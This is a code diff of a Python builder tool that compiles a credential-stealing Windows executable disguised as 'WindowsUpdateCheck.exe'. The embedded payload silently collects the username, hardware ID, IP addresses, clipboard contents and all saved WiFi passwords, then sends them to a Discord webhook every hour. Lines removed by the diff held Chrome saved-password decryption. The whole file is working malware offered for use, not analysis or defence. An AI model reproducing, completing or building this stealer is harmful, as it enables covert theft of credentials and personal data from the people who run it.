@@ -13,7 +13,7 @@ import requests
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
     try:
-        resp = requests.post(hook, json={"content": "Full stealer test - webhook alive 🔥"}, timeout=10)
+        resp = requests.post(hook, json={"content": "Stealer test - webhook alive 🔥"}, timeout=10)
         if resp.status_code in [200, 204]:
             return True, "Webhook working - test message sent."
         else:
@@ -24,7 +24,7 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Password Stealer Builder - Silent & Reliable")
+    root.title("Stealer Builder - Back to Working Basics + Extras")
     root.geometry("600x320")
     root.resizable(False, False)
     
@@ -47,7 +47,7 @@ def get_webhook():
     def build():
         webhook = webhook_entry.get().strip()
         if not webhook or "discord.com/api/webhooks" not in webhook:
-            messagebox.showerror("Nope", "Valid Discord webhook required.")
+            messagebox.showerror("Nope", "Valid webhook required.")
             return
         
         progress.pack(pady=15)
@@ -60,12 +60,12 @@ def get_webhook():
             progress.pack_forget()
             messagebox.showinfo("Built", 
                 "stealer.exe ready!\n\n"
-                "Based on your WORKING recon stub + full password grab.\n"
-                "• Chrome saved passwords (weak ones like 'possword' highlighted)\n"
-                "• All WiFi passwords\n"
-                "• Clipboard\n"
-                "• Basic recon\n"
-                "Sends JSON file + fallback text. 100% silent.")
+                "Back to your ORIGINAL working exfil method (proven to send).\n"
+                "Now grabs:\n"
+                "• Full basic recon (HWID, IP, username, etc)\n"
+                "• All stored WiFi passwords\n"
+                "• Clipboard content\n\n"
+                "Sends as .txt file + fallback text. Zero pywin32 = zero crashes.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
@@ -75,46 +75,59 @@ def get_webhook():
     tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
-# =================== FULL STEALER PAYLOAD (BASED ON WORKING ONE) ===================
+# =================== WORKING PAYLOAD - NO PYWIN32 ===================
 stealer_code = textwrap.dedent('''
 import os
-import json
-import sqlite3
-import win32crypt
-import shutil
 import subprocess
-import requests
-import getpass
-import platform
 import socket
-from datetime import datetime
+import requests
+import platform
+import uuid
 import ctypes
 import time
+from datetime import datetime
 
 WEBHOOK = "{WEBHOOK_PLACEHOLDER}"
 
-def gather_data():
-    data = {}
-    user = getpass.getuser()
-    data['user'] = user
-    data['hostname'] = socket.gethostname()
-    data['os'] = platform.platform()
-    data['time'] = datetime.now().isoformat()
+def get_public_ip():
+    try:
+        return requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        return "Failed"
 
-    # Clipboard
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Failed"
+
+def get_hwid():
+    try:
+        return subprocess.check_output("wmic csproduct get uuid", shell=True, text=True).split('\\n')[1].strip()
+    except:
+        return str(uuid.getnode())
+
+def get_clipboard():
     try:
         CF_TEXT = 1
         user32 = ctypes.windll.user32
         user32.OpenClipboard(0)
         if user32.IsClipboardFormatAvailable(CF_TEXT):
             handle = user32.GetClipboardData(CF_TEXT)
-            data['clipboard'] = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
+            data = ctypes.c_char_p(handle).value.decode('utf-8', errors='ignore')
+        else:
+            data = "No text in clipboard"
         user32.CloseClipboard()
+        return data
     except:
-        data['clipboard'] = "failed"
+        return "Clipboard access failed"
 
-    # WiFi
-    data['wifi'] = []
+def get_wifi_passwords():
+    wifi = []
     try:
         profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, errors='ignore').decode('utf-8', errors='ignore')
         profile_names = [line.split(":")[1].strip() for line in profiles.split('\\n') if "All User Profile" in line]
@@ -123,53 +136,43 @@ def gather_data():
                 result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True, errors='ignore').decode('utf-8', errors='ignore')
                 key = [line.split(":")[1].strip() for line in result.split('\\n') if "Key Content" in line]
                 if key:
-                    data['wifi'].append({profile: key[0]})
+                    wifi.append(f"{profile}: {key[0]}")
             except:
                 pass
+        return "\\n".join(wifi) if wifi else "No WiFi profiles or failed"
     except:
-        data['wifi'] = ["failed"]
-
-    # Chrome passwords
-    data['chrome_passwords'] = []
-    login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
-    if os.path.exists(login_db):
-        try:
-            temp_db = os.path.join(os.getenv("TEMP"), "LoginTemp")
-            shutil.copy2(login_db, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                encrypted_pw = row[2]
-                try:
-                    decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
-                    if any(weak in decrypted.lower() for weak in ["possword", "p@ssw0rd", "password", "admin", "123", "qwerty", "letmein"]):
-                        data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
-                except:
-                    pass
-            conn.close()
-            os.remove(temp_db)
-        except:
-            data['chrome_passwords'] = ["failed or locked"]
-
-    return data
+        return "WiFi grab failed"
 
 def exfil():
     time.sleep(5)
-    payload_json = json.dumps(gather_data(), indent=2)
-    temp_file = os.path.join(os.getenv("TEMP"), "report.json")
+    
+    data = f"""\
+FULL REPORT - {datetime.utcnow().isoformat()} UTC
+==================================================
+Username       : {os.getenv("USERNAME")}
+Computer Name  : {platform.node()}
+OS             : {platform.system()} {platform.release()} ({platform.version()})
+HWID           : {get_hwid()}
+Public IP      : {get_public_ip()}
+Local IP       : {get_local_ip()}
+Clipboard      : {get_clipboard()}
+
+Stored WiFi Passwords:
+{get_wifi_passwords()}
+"""
+    temp_file = os.path.join(os.getenv("TEMP"), "system_check.txt")
+    
     try:
         with open(temp_file, "w", encoding="utf-8") as f:
-            f.write(payload_json)
+            f.write(data)
+        
         with open(temp_file, "rb") as f:
-            files = {"file": ("grab.json", f)}
-            content = {"content": f"**Full Grab** - {getpass.getuser()}@{socket.gethostname()}"}
-            requests.post(WEBHOOK, data=content, files=files, timeout=30)
+            files = {"file": ("report.txt", f)}
+            payload = {"content": f"**New hit** - {os.getenv('USERNAME')}@{platform.node()}"}
+            requests.post(WEBHOOK, data=payload, files=files, timeout=30)
     except:
         try:
-            requests.post(WEBHOOK, json={"content": f"**Fallback Grab**\\n```json\\n{payload_json}\\n```"})
+            requests.post(WEBHOOK, json={"content": f"**Fallback Report**\\n```\\n{data}\\n```"})
         except:
             pass
     finally:
@@ -184,10 +187,10 @@ while True:
     time.sleep(3600)
 ''')
 
-# =================== BUILD WITH NUCLEAR PYWIN32 FLAGS ===================
+# =================== BUILD ===================
 def generate_malware(webhook):
     temp_dir = tempfile.mkdtemp()
-    script_path = os.path.join(temp_dir, "stealer.py")
+    script_path = os.path.join(temp_dir, "payload.py")
     
     try:
         with open(script_path, "w", encoding="utf-8") as f:
@@ -198,12 +201,6 @@ def generate_malware(webhook):
             "--onefile",
             "--noconsole",
             "--name", "WindowsUpdateCheck",
-            "--hidden-import", "win32crypt",
-            "--hidden-import", "pywintypes",
-            "--hidden-import", "pythoncom",
-            "--collect-all", "win32crypt",
-            "--collect-all", "pywin32",
-            "--collect-submodules", "win32crypt",
             script_path
         ]
         
@@ -214,12 +211,10 @@ def generate_malware(webhook):
         built_exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
         final_exe = os.path.join(os.getcwd(), "stealer.exe")
         shutil.copyfile(built_exe, final_exe)
-        print(f"Stealer built: {final_exe}")
     finally:
-        shutil.rmtree(temp_dir, ignore_errors=True)  # No leftover .py ever
+        shutil.rmtree(temp_dir, ignore_errors=True)  # No leftovers
 
-if __name__ == "__main__":
-    get_webhook()
+    print(f"Working stealer built: {final_exe}")
 
 if __name__ == "__main__":
     get_webhook()
